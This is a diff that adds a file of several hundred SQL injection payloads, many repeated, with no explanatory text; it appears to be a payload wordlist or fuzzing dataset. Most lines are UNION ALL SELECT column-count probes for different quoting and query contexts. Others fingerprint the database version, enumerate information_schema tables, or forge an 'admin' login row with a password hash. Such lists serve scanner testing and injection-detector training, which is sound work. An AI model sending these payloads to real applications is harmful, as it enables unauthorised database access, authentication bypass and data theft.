@@ -1,0 +1,500 @@
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3667%'   )    )    union all select 3560,3560,3560--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-3667%'   )    )    union all select 3560,3560,3560--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-2899"   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--
+-3667%'   )    )    union all select 3560,3560,3560--
+-2314%'   )    )    union all select 4612,4612--
+-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--
+-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--
+-4058  )   union all select 9184--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-4058  )   union all select 9184--
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--
+-7637" union all select 8498,8498,8498--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-7637" union all select 8498,8498,8498--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--
+ )   union select * from information_schema.tables,
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--
+-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-4869%' union all select 5729,5729,5729--
+-3667%'   )    )    union all select 3560,3560,3560--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-3017"   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-3017"   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--
+-4869%' union all select 5729,5729,5729--
+-3638" union all select 4394,4394,4394,4394,4394,4394,4394--
+-6186' in boolean mode  )   union all select 2990,2990,2990#
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-6186' in boolean mode  )   union all select 2990,2990,2990#
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-2314%'   )    )    union all select 4612,4612--
+1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-3667%'   )    )    union all select 3560,3560,3560--
+-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-3667%'   )    )    union all select 3560,3560,3560--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+ select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-4058  )   union all select 9184--
+-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-2899"   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--
+-3667%'   )    )    union all select 3560,3560,3560--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3638" union all select 4394,4394,4394,4394,4394,4394,4394--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-6186' in boolean mode  )   union all select 2990,2990,2990#
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-4058  )   union all select 9184--
+-4955%' union all select 5928,5928--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-2314%'   )    )    union all select 4612,4612--
+-2314%'   )    )    union all select 4612,4612--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-4058  )   union all select 9184--
+-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--
+-2230%" union all select 3303,3303,3303--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-7637" union all select 8498,8498,8498--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-4058  )   union all select 9184--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+ select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7111%" union all select 6083,6083,6083,6083,6083,6083--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-2899"   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+ )   union select * from information_schema.tables,
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+ select * from users where id  =  '1' or ""<@ union select 1,version  (    )   -- 1'
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-7111%" union all select 6083,6083,6083,6083,6083,6083--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+ select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+ select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1
+-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+union select * from users where login   =   char ...
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+ select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'
+-3667%'   )    )    union all select 3560,3560,3560--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+ select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-6186' in boolean mode  )   union all select 2990,2990,2990#
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+ )   union select * from information_schema.tables,
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+ select * from users where id  =  '1' union select 1"!",banner from v$version where rownum  =  1 -- 1'
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3017"   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--
+-2899"   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-3667%'   )    )    union all select 3560,3560,3560--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-3667%'   )    )    union all select 3560,3560,3560--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+ )   union select * from information_schema.tables,
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+ )   union select * from information_schema.tables,
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+ select * from users where id  =  1 or 1#"? union select version  (    )  ,version  (    )   -- 1
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-6186' in boolean mode  )   union all select 2990,2990,2990#
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-2230%" union all select 3303,3303,3303--
+-4058  )   union all select 9184--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+-4058  )   union all select 9184--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+ )   union select * from information_schema.tables,
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+-7111%" union all select 6083,6083,6083,6083,6083,6083--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-3667%'   )    )    union all select 3560,3560,3560--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+ select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'
+-2899"   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-7485"   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--
+ select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'
+-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-6186' in boolean mode  )   union all select 2990,2990,2990#
+-7627%"   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--
+ select * from users where id  =  1 or 1#"; union select 'a',version  (    )   -- 1
+ select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-7637" union all select 8498,8498,8498--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--
+-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--
+-7111%" union all select 6083,6083,6083,6083,6083,6083--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3667%'   )    )    union all select 3560,3560,3560--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+ select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+ select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-4318"  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-4058  )   union all select 9184--
+-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--
+-3667%'   )    )    union all select 3560,3560,3560--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--
+-7627%"   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+-3667%'   )    )    union all select 3560,3560,3560--
+-3667%'   )    )    union all select 3560,3560,3560--
+-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-7637" union all select 8498,8498,8498--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+-6436' in boolean mode  )   union all select 7589,7589,7589,7589--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--
+-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#
+-7637" union all select 8498,8498,8498--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-1550' in boolean mode  )   union all select 9777,9777,9777--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
+-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#
+-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--
+-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--
+-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--
+-3370' in boolean mode  )   union all select 3432,3432,3432,3432#
+ select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'
+-1710"   )    )    as cvky where 1858  =  1858 union all select 1858,1858--
+-4058  )   union all select 9184--
+-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--
+-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--
+ )   union select * from information_schema.tables,
+-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--
